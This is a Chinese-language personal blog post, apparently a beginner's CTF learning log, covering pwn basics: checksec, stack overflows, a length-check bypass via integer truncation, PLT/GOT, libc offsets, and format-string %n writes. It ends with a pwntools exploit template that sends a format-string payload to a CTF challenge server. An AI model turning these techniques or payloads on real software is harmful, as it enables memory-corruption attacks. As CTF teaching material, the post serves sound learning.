@@ -1,0 +1,121 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="John Doe"><meta name="renderer" content="webkit"><meta name="copyright" content="John Doe"><meta name="keywords" content="Hexo"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>pwn入门体验 · Jche143</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/shark.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Jche</div><div class="profile-signature">qwqqqqqq</div><div class="friends"><div>FRIENDS</div><span><a href="//qjx321.github.io" target="_black">friendA</a></span><span><a href="47.103.121.189" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">n 3^07 !</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">pwn入门体验</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2022-01-19</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="0-1--pwn"> 0-1--pwn</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="Water"><a href="#Water" class="headerlink" title="Water"></a>Water</h2><p>today i do nothing but i open the test of pwn, so……,my first blog in 2022</p>
+<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>2022的第一篇博客，因为没接触过pwn就从攻防世界的新手题跟着做开始，找了一个视频跟着学和写，刚接触下来还是觉得比较有意思，但是听说看东西很折磨人）</p>
+<h2 id="Point"><a href="#Point" class="headerlink" title="Point"></a>Point</h2><p>最开始的做题步骤首先是查位数，逆向中一般直接使用DIE就可以，在pwn里面可以直接file来查看文件的位数，这在编写exp文件的时候需要。然后是checksec命令，帮助我们看开了甚么保护。但打保护这方面我还没有学到，记得查就对了，养成好习惯。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 --  file 文件名</span><br><span class="line">2 --  checksec --file=文件名</span><br></pre></td></tr></table></figure>
+
+<p><img src="pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/1.png" alt="1"></p>
+<p>这里可以看到是一个32位的文件了，下一步是在ida里进行静态分析，然后确定漏洞类型，整理逻辑。</p>
+<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>一开始的题就是栈溢出，比较好理解。通过溢出覆盖字节为你想要的内容来得到flag。一般都会有if语句判断数据是否等于一个规定的数据，通过溢出写入数据就可以达成目的。</p>
+<h3 id="溢出点"><a href="#溢出点" class="headerlink" title="溢出点"></a>溢出点</h3><p>关于我做了一丢丢题，一般溢出点都会是buf等等，通过write，read，get等函数来溢出。要注意有漏洞的函数然后观察是否有溢出的可能性。</p>
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>有一道题他需要溢出14+4个字节，但检验了填入数据的长度3-8，也就是说没办法填入那么多垃圾数据来溢出，这里解决的方法是转眼到了数据类型，因为是unsigned  short int，所以用8bit位来算0x101就变成了0x1，即可以257 + 2 ~ 257 + 7都可以通过检测。</p>
+<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>system函数与plt表和got表有关，在用于构造跳转时经常会用到两个表，有system函数说明在plt表中有该函数的地址，溢出返回地址需要为它的地址。跳转到返回地址后填入数据再写入想要的数据。在pwn题里经常需要构造结构来写payload去写入数据，要搞清楚思路和栈里的结构就会很好写脚本。</p>
+<h3 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h3><p>libc文件和文件中的地址是不同的，不能直接用文件中的地址去打，会找到错误的地方，但地址之间的偏移量是固定的，所以可以计算文件和libc文件中的相应函数之间的固定偏移量，运用偏移量来寻址。从而继续构造结构来写脚本的payload。</p>
+<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>还没仔细看资料，只是知道有这个东西，可以配合%n来写入数据，格式化字符串漏洞一般都需要调试文件，写入测试数据和一堆%p（地址）来找到漏洞的位置以便写入文件需要的数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>攻防世界新手区详细的每道题解在这里<a target="_blank" rel="noopener" href="http://www.peiqi.tech/posts/7499/#when-did-you-born">http://www.peiqi.tech/posts/7499/#when-did-you-born</a></p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>通过写exp.py文件来打，模板和注意就放在这里。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;x86&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>) <span class="comment">#x86是32位文件，amd64就是64位文件</span></span><br><span class="line">content = <span class="number">0</span> <span class="comment">#攻击远程，打本地是1</span></span><br><span class="line">pwn_addr = <span class="number">0x0804A068</span> <span class="comment">#一般将地址写在这里</span></span><br><span class="line"><span class="comment">#如果是elf文件中可以寻址</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;level3&quot;) elf文件寻址需要写这个</span></span><br><span class="line"><span class="comment">#lib = ELF(&quot;libc_32.so.6&quot;) libc文件寻址需要写这个</span></span><br><span class="line"><span class="comment">#write_plt_addr = elf.plt[&quot;write&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span> <span class="comment">#main函数</span></span><br><span class="line">    <span class="keyword">global</span> sh</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>: <span class="comment">#打本地</span></span><br><span class="line">        sh = process(<span class="string">&#x27;CGfsb&#x27;</span>) <span class="comment">#文件名</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#打远程</span></span><br><span class="line">        sh = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">63601</span>) <span class="comment">#端口和ip</span></span><br><span class="line"></span><br><span class="line">    payload = p32(pwn_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + <span class="string">b&#x27;%10$n&#x27;</span> <span class="comment">#payload一般就是写入，填入数据的话需要以byte（字节流）的形式填入，不然会出错，这里的写入的地址等都要以p32或者p64来打包</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;please tell me your name:\n&quot;</span>,<span class="string">&quot;1&quot;</span>) <span class="comment">#sendlineafter，前面是程序中的语句，后面是你需要输入的东西</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;leave your message please:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()<span class="comment">#接收信息</span></span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>少打音游多读书</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://example.com">John Doe</a></p><p> <span>Link:  </span><a href="http://example.com/2022/01/19/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/">http://example.com/2022/01/19/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2021/12/30/XXTEA-python/" title="XXTEA python"><span>NextPost ></span><br><span class="nextTitle">XXTEA python</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Water"><span class="toc-number">1.</span> <span class="toc-text">Water</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Start"><span class="toc-number">2.</span> <span class="toc-text">Start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Point"><span class="toc-number">3.</span> <span class="toc-text">Point</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">3.1.</span> <span class="toc-text">栈溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">溢出点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.3.</span> <span class="toc-text">数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system"><span class="toc-number">3.4.</span> <span class="toc-text">system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc%E6%B3%84%E9%9C%B2"><span class="toc-number">3.5.</span> <span class="toc-text">libc泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text">格式化字符串漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.7.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-py"><span class="toc-number">4.</span> <span class="toc-text">exp.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#END"><span class="toc-number">5.</span> <span class="toc-text">END</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
